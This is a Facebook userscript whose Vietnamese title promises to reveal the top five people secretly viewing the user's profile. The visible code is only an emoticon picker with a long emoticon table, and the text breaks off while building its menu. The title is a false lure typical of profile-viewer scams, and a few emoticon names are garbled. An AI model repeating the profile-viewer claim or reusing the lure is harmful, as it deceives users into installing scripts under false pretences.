// ==UserScript==
// @name            TOP 5 NGƯỜI THEO DÕI XEM TRỘM FACEBOOK CỦA BẠN
// @description     All about facebook By Kòi Chảnh Chó
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==Icon==
(function() {
	// Active only in main frame
	if (!document.querySelector("#pageNav")) {
		return;
	}
	//console.info("Extra Facebook Smileys");

	// = Data =======
	var emoticons = [ { // Text to picture emoticons
"chars" : " :) ",
		"class" : "emoticon_smile",
		"name" : "Smiley"
	}, {
		"chars" : " :( ",
		"class" : "emoticon_frown",
		"name" : "Frown"
	}, {
		"chars" : " :P ",
		"class" : "emoticon_tongue",
		"name" : "Tongue"
	}, {
        "chars" : " :D ",
		"class" : "emoticon_grin",
		"name" : "Grin"
	}, {
		"chars" : " :o ",
		"class" : "emoticon_gasp",
		"name" : "Gasp"
	}, {
		"chars" : " ;) ",
		"class" : "emoticon_wink",
		"name" : "Wink"
	}, {
		"chars" : " :v ",
		"class" : "emoticon_pacman",
		"name" : "Pacman"
	}, {
		"chars" : " >:( ",
		"class" : "emoticon_grumpy",
		"name" : "Gru?ƒÂ±?ƒÂ³n"
	}, {
		"chars" : " :/ ",
		"class" : "emoticon_unsure",
		"name" : "Unsure"
	}, {
		"chars" : " :'( ",
		"class" : "emoticon_cry",
		"name" : "Cry"
	}, {
		"chars" : " ^_^ ",
		"class" : "emoticon_kiki",
		"name" : "Kiki"
	}, {
		"chars" : " 8) ",
		"class" : "emoticon_glasses",
		"name" : "Glasses"
	}, {
		"chars" : " B| ",
		"class" : "emoticon_sunglasses",
		"name" : "Sunglasses"
	}, {
		"chars" : " <3 ",
		"class" : "emoticon_heart",
		"name" : "Heart"
	}, {
		"chars" : " 3:) ",
		"class" : "emoticon_devil",
		"name" : "Devil"
	}, {
		"chars" : " O:) ",
		"class" : "emoticon_angel",
		"name" : "Angel"
	}, {
		"chars" : " -_- ",
		"class" : "emoticon_squint",
		"name" : "Squint"
	}, {
		"chars" : " o.O ",
		"class" : "emoticon_confused",
		"name" : "Confused"
	}, {
		"chars" : " >:o ",
		"class" : "emoticon_upset",
		"name" : "Upset"
	}, {
		"chars" : " :3 ",
		"class" : "emoticon_colonthree",
		"name" : "Colonthree"
	}, {
		"chars" : " (y) ",
		"class" : "emoticon_like",
		"name" : "Like"
	}, {
		"chars" : " :* ",
		"class" : "emoticon emoticon_kiss",
		"name" : "Kiss"
	}, {
		"chars" : " (^^^) ",
		"class" : "emoticon_shark",
		"name" : "Shark"
	}, {
		"chars" : " :|] ",
		"class" : "emoticon_robot",
		"name" : "Robot"
	}, {
		"chars" : " <(\") ",
		"class" : "emoticon_penguin",
		"name" : "Ping?ƒÂ¼ino"
	}, {
		"chars" : " :poop: ",
		"class" : "emoticon_poop",
		"name" : "Poop"
        }, {
		"chars" : " :putnam: ",
		"class" : "emoticon_putnam",
		"name" : "Putman"
	}, {
		"chars" : " \ud83c\udf02 ",
		"class" : "_1az _1a- _2c0",
		"name" : "Pink Umbrella"
	}, {
		"chars" : " \ud83c\udf0a ",
		"class" : "_1az _1a- _2c1",
		"name" : "Sea Wave"
	}, {
		"chars" : " \ud83c\udf19 ",
		"class" : "_1az _1a- _2c2",
		"name" : "Crescent moon"
	}, {
		"chars" : " \ud83c\udf1f ",
		"class" : "_1az _1a- _2c3",
		"name" : "Bright Star"
	}, {
		"chars" : " \ud83c\udf31 ",
		"class" : "_1az _1a- _2c4",
		"name" : "Seedbed"
	}, {
		"chars" : " \ud83c\udf34 ",
		"class" : "_1az _1a- _2c5",
		"name" : "Single Palm Tree"
	}, {
		"chars" : " \ud83c\udf35 ",
		"class" : "_1az _1a- _2c6",
		"name" : "Cactus"
	}, {
		"chars" : " \ud83c\udf37 ",
		"class" : "_1az _1a- _2c7",
		"name" : "Tulip"
	}, {
		"chars" : " \ud83c\udf38 ",
		"class" : "_1az _1a- _2c8",
		"name" : "Cherry Blossom"
	}, {
		"chars" : " \ud83c\udf39 ",
		"class" : "_1az _1a- _2c9",
		"name" : "Rose"
	}, {
		"chars" : " \ud83c\udf3a ",
		"class" : "_1az _1a- _2ca",
		"name" : "Cayenne"
	}, {
		"chars" : " \ud83c\udf3b ",
		"class" : "_1az _1a- _2cb",
		"name" : "Sunflower"
	}, {
		"chars" : " \ud83c\udf3e ",
		"class" : "_1az _1a- _2cc",
		"name" : "Ear Of Rice"
	}, {
		"chars" : " \ud83c\udf40 ",
		"class" : "_1az _1a- _2cd",
		"name" : "Four Leaf Clover"
	}, {
		"chars" : " \ud83c\udf41 ",
		"class" : "_1az _1a- _2ce",
		"name" : "Maple Leaf"
	}, {
		"chars" : " \ud83c\udf42 ",
		"class" : "_1az _1a- _2cf",
		"name" : "Fallen Leaf"
	}, {
		"chars" : " \ud83c\udf43 ",
		"class" : "_1az _1a- _2cg",
		"name" : "Leaf Floating In The Wind"
	}, {
		"chars" : " \ud83c\udf4a ",
		"class" : "_1az _1a- _2ch",
		"name" : "Tangerine"
	}, {
		"chars" : " \ud83c\udf4e ",
		"class" : "_1az _1a- _2ci",
		"name" : "Red Apple"
	}, {
		"chars" : " \ud83c\udf53 ",
		"class" : "_1az _1a- _2cj",
		"name" : "Strawberry"
	}, {
		"chars" : " \ud83c\udf54 ",
		"class" : "_1az _1a- _2ck",
		"name" : "Burger"
	}, {
		"chars" : " \ud83c\udf78 ",
		"class" : "_1az _1a- _2cl",
		"name" : "Cocktail Glass"
	}, {
		"chars" : " \ud83c\udf7a ",
		"class" : "_1az _1a- _2cm",
		"name" : "Tankard"
	}, {
		"chars" : " \ud83c\udf81 ",
		"class" : "_1az _1a- _2cn",
		"name" : "Gift Wrapped"
	}, {
		"chars" : " \ud83c\udf83 ",
		"class" : "_1az _1a- _2co",
		"name" : "Pumpkin With Candle"
	}, {
		"chars" : " \ud83c\udf84 ",
		"class" : "_1az _1a- _2cp",
		"name" : "Christmas Tree"
	}, {
		"chars" : " \ud83c\udf85 ",
		"class" : "_1az _1a- _2cq",
		"name" : "Santa"
	}, {
		"chars" : " \ud83c\udf88 ",
		"class" : "_1az _1a- _2cr",
		"name" : "Balloon"
	}, {
		"chars" : " \ud83c\udf89 ",
		"class" : "_1az _1a- _2cs",
		"name" : "Party Popper"
	}, {
		"chars" : " \ud83c\udf8d ",
		"class" : "_1az _1a- _2ct",
		"name" : "Pine Decor"
	}, {
		"chars" : " \ud83c\udf8e ",
		"class" : "_1az _1a- _2cu",
		"name" : "Japanese Dolls"
	}, {
		"chars" : " \ud83c\udf8f ",
		"class" : "_1az _1a- _2cv",
		"name" : "Carp Streamer"
	}, {
		"chars" : " \ud83c\udf90 ",
		"class" : "_1az _1a- _2cw",
		"name" : "Wind Chime"
	}, {
		"chars" : " \ud83c\udf93 ",
		"class" : "_1az _1a- _2cx",
		"name" : "Graduation Cap"
	}, {
		"chars" : " \ud83c\udfb5 ",
		"class" : "_1az _1a- _2cy",
		"name" : "Musical Note"
	}, {
		"chars" : " \ud83c\udfb6 ",
		"class" : "_1az _1a- _2cz",
		"name" : "Multiple Musical Notes"
	}, {
		"chars" : " \ud83c\udfbc ",
		"class" : "_1az _1a- _2c-",
		"name" : "Musical Score"
	}, {
		"chars" : " \ud83d\udc0d ",
		"class" : "_1az _1a- _2c_",
		"name" : "Snake"
	}, {
		"chars" : " \ud83d\udc0e ",
		"class" : "_1az _1a- _2d0",
		"name" : "Horse"
	}, {
		"chars" : " \ud83d\udc11 ",
		"class" : "_1az _1a- _2d1",
		"name" : "Sheep"
	}, {
		"chars" : " \ud83d\udc12 ",
		"class" : "_1az _1a- _2d2",
		"name" : "Monkey"
	}, {
		"chars" : " \ud83d\udc14 ",
		"class" : "_1az _1a- _2d3",
		"name" : "Hen"
	}, {
		"chars" : " \ud83d\udc17 ",
		"class" : "_1az _1a- _2d4",
		"name" : "Wild Boar"
	}, {
		"chars" : " \ud83d\udc18 ",
		"class" : "_1az _1a- _2d5",
		"name" : "Elephant"
	}, {
		"chars" : " \ud83d\udc19 ",
		"class" : "_1az _1a- _2d6",
		"name" : "Octopus"
	}, {
		"chars" : " \ud83d\udc1a ",
		"class" : "_1az _1a- _2d7",
		"name" : "Snail Shell"
	}, {
		"chars" : " \ud83d\udc1b ",
		"class" : "_1az _1a- _2d8",
		"name" : "Insect"
	}, {
		"chars" : " \ud83d\udc1f ",
		"class" : "_1az _1a- _2d9",
		"name" : "Fish"
	}, {
		"chars" : " \ud83d\udc20 ",
		"class" : "_1az _1a- _2da",
		"name" : "Tropical Fish"
	}, {
		"chars" : " \ud83d\udc21 ",
		"class" : "_1az _1a- _2db",
		"name" : "Pufferfish"
	}, {
		"chars" : " \ud83d\udc25 ",
		"class" : "_1az _1a- _2dc",
		"name" : "Chick In Front"
	}, {
		"chars" : " \ud83d\udc26 ",
		"class" : "_1az _1a- _2dd",
		"name" : "Bird"
	}, {
		"chars" : " \ud83d\udc27 ",
		"class" : "_1az _1a- _2de",
		"name" : "Penguin"
	}, {
		"chars" : " \ud83d\udc28 ",
		"class" : "_1az _1a- _2df",
		"name" : "Koala"
	}, {
		"chars" : " \ud83d\udc29 ",
		"class" : "_1az _1a- _2dg",
		"name" : "Poodle"
	}, {
		"chars" : " \ud83d\udc2b ",
		"class" : "_1az _1a- _2dh",
		"name" : "Bactrian Camel"
	}, {
		"chars" : " \ud83d\udc2c ",
		"class" : "_1az _1a- _2di",
		"name" : "Dolphin"
	}, {
		"chars" : " \ud83d\udc2d ",
		"class" : "_1az _1a- _2dj",
		"name" : "Mouse Face"
	}, {
		"chars" : " \ud83d\udc2e ",
		"class" : "_1az _1a- _2dk",
		"name" : "Cow Face"
	}, {
		"chars" : " \ud83d\udc2f ",
		"class" : "_1az _1a- _2dl",
		"name" : "Cara de tigre"
	}, {
		"chars" : " \ud83d\udc30 ",
		"class" : "_1az _1a- _2dm",
		"name" : "Rabbit Face"
	}, {
		"chars" : " \ud83d\udc31 ",
		"class" : "_1az _1a- _2dn",
		"name" : "Cat Face"
	}, {
		"chars" : " \ud83d\udc33 ",
		"class" : "_1az _1a- _2do",
		"name" : "Whale Sputtering"
	}, {
		"chars" : " \ud83d\udc34 ",
		"class" : "_1az _1a- _2dp",
		"name" : "Horse Face"
	}, {
		"chars" : " \ud83d\udc35 ",
		"class" : "_1az _1a- _2dq",
		"name" : "Monkey Face"
	}, {
		"chars" : " \ud83d\udc37 ",
		"class" : "_1az _1a- _2dr",
		"name" : "Pig face"
	}, {
		"chars" : " \ud83d\udc38 ",
		"class" : "_1az _1a- _2ds",
		"name" : "Frog Face"
	}, {
		"chars" : " \ud83d\udc39 ",
		"class" : "_1az _1a- _2dt",
		"name" : "Hamster Face"
	}, {
		"chars" : " \ud83d\udc3a ",
		"class" : "_1az _1a- _2du",
		"name" : "Wolf Face"
	}, {
		"chars" : " \ud83d\udc3b ",
		"class" : "_1az _1a- _2dv",
		"name" : "Bear Face"
	}, {
		"chars" : " \ud83d\udc3e ",
		"class" : "_1az _1a- _2dw",
		"name" : "Footprints"
	}, {
		"chars" : " \ud83d\udc40 ",
		"class" : "_1az _1a- _2dx",
		"name" : "Eyes"
	}, {
		"chars" : " \ud83d\udc42 ",
		"class" : "_1az _1a- _2dy",
		"name" : "Ear"
	}, {
		"chars" : " \ud83d\udc43 ",
		"class" : "_1az _1a- _2dz",
		"name" : "Nose"
	}, {
		"chars" : " \ud83d\udc44 ",
		"class" : "_1az _1a- _2d-",
		"name" : "Mouth"
	}, {
		"chars" : " \ud83d\udc45 ",
		"class" : "_1az _1a- _2d_",
		"name" : "Sour Face"
	}, {
		"chars" : " \ud83d\udc46 ",
		"class" : "_1az _1a- _2e0",
		"name" : "White hand pointing up"
	}, {
		"chars" : " \ud83d\udc47 ",
		"class" : "_1az _1a- _2e1",
		"name" : "White hand faces downward"
	}, {
		"chars" : " \ud83d\udc48 ",
		"class" : "_1az _1a- _2e2",
		"name" : "White hand indicating left"
	}, {
		"chars" : " \ud83d\udc49 ",
		"class" : "_1az _1a- _2e3",
		"name" : "White hand indicating right"
	}, {
		"chars" : " \ud83d\udc4a ",
		"class" : "_1az _1a- _2e4",
		"name" : "Fist"
	}, {
		"chars" : " \ud83d\udc4b ",
		"class" : "_1az _1a- _2e5",
		"name" : "Hand in motion"
	}, {
		"chars" : " \ud83d\udc4c ",
		"class" : "_1az _1a- _2e6",
		"name" : "Hand showing all good"
	}, {
		"chars" : " \ud83d\udc4d ",
		"class" : "_1az _1a- _2e7",
		"name" : "Hand with thumb up"
	}, {
		"chars" : " \ud83d\udc4e ",
		"class" : "_1az _1a- _2e8",
		"name" : "Hand with thumb down"
	}, {
		"chars" : " \ud83d\udc4f ",
		"class" : "_1az _1a- _2e9",
		"name" : "Hands clapping"
	}, {
		"chars" : " \ud83d\udc50 ",
		"class" : "_1az _1a- _2ea",
		"name" : "Open Hands"
	}, {
		"chars" : " \ud83d\udc66 ",
		"class" : "_1az _1a- _2eb",
		"name" : "Boy"
	}, {
		"chars" : " \ud83d\udc67 ",
		"class" : "_1az _1a- _2ec",
		"name" : "Girl"
	}, {
		"chars" : " \ud83d\udc68 ",
		"class" : "_1az _1a- _2ed",
		"name" : "Man"
	}, {
		"chars" : " \ud83d\udc69 ",
		"class" : "_1az _1a- _2ee",
		"name" : "Woman"
	}, {
		"chars" : " \ud83d\udc6b ",
		"class" : "_1az _1a- _2ef",
		"name" : "Man and woman holding hands"
	}, {
		"chars" : " \ud83d\udc6e ",
		"class" : "_1az _1a- _2eg",
		"name" : "Police Officer"
	}, {
		"chars" : " \ud83d\udc6f ",
		"class" : "_1az _1a- _2eh",
		"name" : "Woman with bunny ears"
	}, {
		"chars" : " \ud83d\udc71 ",
		"class" : "_1az _1a- _2ei",
		"name" : "Person with hair rubio"
	}, {
		"chars" : " \ud83d\udc72 ",
		"class" : "_1az _1a- _2ej",
		"name" : "Man with pi mao gua"
	}, {
		"chars" : " \ud83d\udc73 ",
		"class" : "_1az _1a- _2ek",
		"name" : "Man with turban"
	}, {
		"chars" : " \ud83d\udc74 ",
		"class" : "_1az _1a- _2el",
		"name" : "Old Man"
	}, {
		"chars" : " \ud83d\udc75 ",
		"class" : "_1az _1a- _2em",
		"name" : "Old Woman"
	}, {
		"chars" : " \ud83d\udc76 ",
		"class" : "_1az _1a- _2en",
		"name" : "Baby"
	}, {
		"chars" : " \ud83d\udc77 ",
		"class" : "_1az _1a- _2eo",
		"name" : "Construction Worker"
	}, {
		"chars" : " \ud83d\udc78 ",
		"class" : "_1az _1a- _2ep",
		"name" : "Princess"
	}, {
		"chars" : " \ud83d\udc7b ",
		"class" : "_1az _1a- _2eq",
		"name" : "Ghost"
	}, {
		"chars" : " \ud83d\udc7c ",
		"class" : "_1az _1a- _2er",
		"name" : "Angel baby"
	}, {
		"chars" : " \ud83d\udc7d ",
		"class" : "_1az _1a- _2es",
		"name" : "Alien"
	}, {
		"chars" : " \ud83d\udc7e ",
		"class" : "_1az _1a- _2et",
		"name" : "Alien Monster"
	}, {
		"chars" : " \ud83d\udc7f ",
		"class" : "_1az _1a- _2eu",
		"name" : "Imp"
	}, {
		"chars" : " \ud83d\udc80 ",
		"class" : "_1az _1a- _2ev",
		"name" : "Skull"
	}, {
		"chars" : " \ud83d\udc82 ",
		"class" : "_1az _1a- _2ew",
		"name" : "Guard"
	}, {
		"chars" : " \ud83d\udc83 ",
		"class" : "_1az _1a- _2ex",
		"name" : "Ballerina"
	}, {
		"chars" : " \ud83d\udc85 ",
		"class" : "_1az _1a- _2ey",
		"name" : "Nail Polish"
	}, {
		"chars" : " \ud83d\udc8b ",
		"class" : "_1az _1a- _2ez",
		"name" : "Brand of kiss"
	}, {
		"chars" : " \ud83d\udc8f ",
		"class" : "_1az _1a- _2e-",
		"name" : "Kissing couple"
	}, {
		"chars" : " \ud83d\udc90 ",
		"class" : "_1az _1a- _2e_",
		"name" : "Bunch of flowers"
	}, {
		"chars" : " \ud83d\udc91 ",
		"class" : "_1az _1a- _2f0",
		"name" : "Couple with heart"
	}, {
		"chars" : " \ud83d\udc93 ",
		"class" : "_1az _1a- _2f1",
		"name" : "Heart beating"
	}, {
		"chars" : " \ud83d\udc94 ",
		"class" : "_1az _1a- _2f2",
		"name" : "Broken Heart"
	}, {
		"chars" : " \ud83d\udc96 ",
		"class" : "_1az _1a- _2f3",
		"name" : "Bright Heart"
	}, {
		"chars" : " \ud83d\udc97 ",
		"class" : "_1az _1a- _2f4",
		"name" : "Heart growing"
	}, {
		"chars" : " \ud83d\udc98 ",
		"class" : "_1az _1a- _2f5",
		"name" : "Heart with arrow"
	}, {
		"chars" : " \ud83d\udc99 ",
		"class" : "_1az _1a- _2f6",
		"name" : "Blue Heart"
	}, {
		"chars" : " \ud83d\udc9a ",
		"class" : "_1az _1a- _2f7",
		"name" : "Green Heart"
	}, {
		"chars" : " \ud83d\udc9b ",
		"class" : "_1az _1a- _2f8",
		"name" : "Yellow Heart"
	}, {
		"chars" : " \ud83d\udc9c ",
		"class" : "_1az _1a- _2f9",
		"name" : "Purple Heart"
	}, {
		"chars" : " \ud83d\udc9d ",
		"class" : "_1az _1a- _2fa",
		"name" : "Heart with ribbon"
	}, {
		"chars" : " \ud83d\udca2 ",
		"class" : "_1az _1a- _2fb",
		"name" : "Symbol of anger"
	}, {
		"chars" : " \ud83d\udca4 ",
		"class" : "_1az _1a- _2fc",
		"name" : "Sleeping"
	}, {
		"chars" : " \ud83d\udca6 ",
		"class" : "_1az _1a- _2fd",
		"name" : "Sweat Symbol"
	}, {
		"chars" : " \ud83d\udca8 ",
		"class" : "_1az _1a- _2fe",
		"name" : "Quick Start Symbol"
	}, {
		"chars" : " \ud83d\udca9 ",
		"class" : "_1az _1a- _2ff",
		"name" : "Pile of Caca"
	}, {
		"chars" : " \ud83d\udcaa ",
		"class" : "_1az _1a- _2fg",
		"name" : "Flexed bicep"
	}, {
		"chars" : " \ud83d\udcbb ",
		"class" : "_1az _1a- _2fh",
		"name" : "Personal Computer"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Mini Disco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Floppy disk"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Optical Disc"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Telephone receiver"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Mobile Phone"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Mobile phone with arrow from left to right"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Television"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Bell"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Face to face with smiling eyes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Face with tears of joy"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Smiley face with open mouth"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Face and eyes smiling with mouth open"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Smiley face with mouth open and eyes closed"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Face winking eye"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Guy savoring delicious food"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Relief face"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Smiley face with heart shaped eyes"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Smirk face"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Face of boredom"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Face with cold sweat"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Pensive face"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Confused face"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Throwing kiss Face"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Kissing face with eyes closed"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Face with tongue out and winking"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Face with tongue hanging out and eyes closed"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Face discouraged"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Face of anger"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Very angry face"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Crying Face"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Face of perseverance"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Face of triumph"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Face discouraged but relieved"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Scary face"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Fatigued face"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Sleeping face"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Tired face"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Face screaming"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Face with mouth open and cold sweat"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Terrified face of fear"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Very surprised face"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Face flushed"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Face dizzy"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Face with medical mask"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Grinning Cat face and eyes closed"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cat face with tears of laughter"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Smiling cat face with open mouth"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Smiling cat face with hearts in her eyes"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Face of cat smile twisted"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cat face kissing with eyes closed"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cat face crying"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cat face scared terrified"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Happy person raising a hand"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Person holding up both hands in celebration"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Person frowning"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Person in prayer"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Index finger pointing up"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "White face smiling"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "High voltage symbol"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Snowless snowman"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Fist up"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Hand pointing up"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Winning Hand"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sun With Rays"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Cloud"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Umbrella With Rain Drops"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Hot Drink"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brightness"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Heavy Black Heart"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
